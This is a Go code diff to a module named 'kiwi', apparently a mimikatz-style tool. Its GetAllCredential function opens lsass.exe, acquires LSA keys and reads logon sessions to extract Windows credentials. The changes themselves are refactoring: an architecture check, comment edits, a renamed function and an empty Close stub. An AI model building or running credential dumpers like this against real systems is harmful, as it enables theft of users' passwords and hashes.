@@ -4,6 +4,7 @@ package kiwi
 
 import (
 	"fmt"
+	"runtime"
 	"sync"
 
 	"github.com/pkg/errors"
@@ -20,15 +21,16 @@ type Kiwi struct {
 
 	rand *random.Rand
 
-	// privilege
+	// is get debug privilege
 	debug bool
 
 	// 0 = not read, 1 = true, 2 = false
 	wow64 uint8
 
+	// PID of lsass.exe
 	pid uint32
 
-	// about Windows version
+	// version about windows
 	major uint32
 	minor uint32
 	build uint32
@@ -54,12 +56,14 @@ type Kiwi struct {
 	mu sync.Mutex
 }
 
-// NewKiwi is used to create a new kiwi.
-func NewKiwi(logger logger.Logger) *Kiwi {
-	return &Kiwi{
-		logger: logger,
-		rand:   random.NewRand(),
+// NewKiwi is used to create a new kiwi module.
+func NewKiwi(logger logger.Logger) (*Kiwi, error) {
+	switch arch := runtime.GOARCH; arch {
+	case "386", "amd64":
+	default:
+		return nil, errors.Errorf("current architecture %s is not supported", arch)
 	}
+	return &Kiwi{logger: logger, rand: random.NewRand()}, nil
 }
 
 func (kiwi *Kiwi) log(lv logger.Level, log ...interface{}) {
@@ -110,7 +114,7 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	defer api.CloseHandle(pHandle)
 	kiwi.logf(logger.Info, "process handle of lsass.exe is 0x%X", pHandle)
 
-	kiwi.requireNT6LSAKeys(pHandle)
+	kiwi.acquireNT6LSAKeys(pHandle)
 
 	patch := lsaSrvX64References[buildWin10v1903]
 	sessions, err := kiwi.getLogonSessionList(pHandle, patch)
@@ -131,4 +135,9 @@ func (kiwi *Kiwi) GetAllCredential() ([]*Credential, error) {
 	}
 
 	return nil, nil
+}
+
+// TODO destroy key
+func (kiwi *Kiwi) Close() {
+
 }
